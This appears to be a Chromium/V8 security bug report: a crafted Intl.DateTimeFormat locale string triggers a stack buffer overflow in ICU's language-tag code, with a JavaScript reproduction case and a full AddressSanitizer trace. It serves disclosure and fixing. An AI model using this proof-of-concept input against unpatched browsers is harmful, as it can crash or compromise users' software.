VULNERABILITY DETAILS
//uloc_tag.cpp


2412:
uloc_forLanguageTag(const char* langtag,
                    char* localeID,
                    int32_t localeIDCapacity,
                    int32_t* parsedLength,
                    UErrorCode* status) {
2524:
        len = _appendKeywords(lt, localeID + reslen, localeIDCapacity - reslen, status); // integer overflow
        
_appendKeywords(ULanguageTag* langtag, char* appendAt, int32_t capacity, UErrorCode* status) {
    int32_t kwdBufLength = capacity;
1519:
    kwdBuf = (char*)uprv_malloc(kwdBufLength);

VERSION
Version 60.0.3112.113 (Official Build) (64-bit)
Operating System: [Mac OS, 10.12.6]

REPRODUCTION CASE
var date0 = new Date('1995-12-17T03:24:00');
var dateti1 = new Intl.DateTimeFormat("iw-up-a-caiaup-araup-ai-pdu-sp-bs-up-arscna-zeieiaup-araup-arscia-rews-us-up-arscna-zeieiaup-araup-arsciap-arscna-zeieiaup-araup-arscie-u-sp-bs-uaup-arscia");
d = dateti1.format(date0);



FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
$ ~/v8/out/Debug/d8 poc.js
=================================================================
==30991==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffd3d946acd at pc 0x0000004343c4 bp 0x7ffd3d9464d0 sp 0x7ffd3d945c78
READ of size 159 at 0x7ffd3d946acd thread T0
    #0 0x4343c3 in __interceptor_strlen (/home/scdeny/v8/out/Debug/d8+0x4343c3)
    #1 0x41262ea in uloc_toLanguageTag_59 /home/scdeny/v8/out/Debug/../../third_party/icu/source/common/uloc_tag.cpp:2347:9
    #2 0x3804793 in v8::internal::__RT_impl_Runtime_CanonicalizeLanguageTag(v8::internal::Arguments, v8::internal::Isolate*) /home/scdeny/v8/out/Debug/../../src/runtime/runtime-intl.cc:85:3
    #3 0x3803886 in v8::internal::Runtime_CanonicalizeLanguageTag(int, v8::internal::Object**, v8::internal::Isolate*) /home/scdeny/v8/out/Debug/../../src/runtime/runtime-intl.cc:58:1
    #4 0x7f071adced7e  (<unknown module>)

Address 0x7ffd3d946acd is located in stack of thread T0 at offset 461 in frame
    #0 0x3803def in v8::internal::__RT_impl_Runtime_CanonicalizeLanguageTag(v8::internal::Arguments, v8::internal::Isolate*) /home/scdeny/v8/out/Debug/../../src/runtime/runtime-intl.cc:58

  This frame has 14 object(s):
    [32, 48) 'args'
    [64, 88) 'scope' (line 59)
    [128, 136) 'locale_id_str' (line 63)
    [160, 176) 'locale_id' (line 65)
    [192, 200) 'agg.tmp'
    [224, 232) 'agg.tmp15'
    [256, 264) 'agg.tmp16'
    [288, 292) 'error' (line 72)
    [304, 461) 'icu_result' (line 73)
    [528, 532) 'icu_length' (line 74) <== Memory access at offset 461 partially underflows this variable
    [544, 552) 'coerce' <== Memory access at offset 461 partially underflows this variable
    [576, 733) 'result' (line 82) <== Memory access at offset 461 partially underflows this variable
    [800, 808) 'coerce40'
    [832, 840) 'coerce47'
HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow (/home/scdeny/v8/out/Debug/d8+0x4343c3) in __interceptor_strlen
Shadow bytes around the buggy address:
  0x100027b20d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100027b20d10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100027b20d20: f1 f1 f1 f1 00 00 f2 f2 00 00 00 f2 f2 f2 f2 f2
  0x100027b20d30: 00 f2 f2 f2 00 00 f2 f2 00 f2 f2 f2 00 f2 f2 f2
  0x100027b20d40: 00 f2 f2 f2 04 f2 00 00 00 00 00 00 00 00 00 00
=>0x100027b20d50: 00 00 00 00 00 00 00 00 00[05]f2 f2 f2 f2 f2 f2
  0x100027b20d60: f2 f2 04 f2 00 f2 f2 f2 00 00 00 00 00 00 00 00
  0x100027b20d70: 00 00 00 00 00 00 00 00 00 00 00 05 f2 f2 f2 f2
  0x100027b20d80: f2 f2 f2 f2 00 f2 f2 f2 00 f3 f3 f3 00 00 00 00
  0x100027b20d90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x100027b20da0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==30991==ABORTING


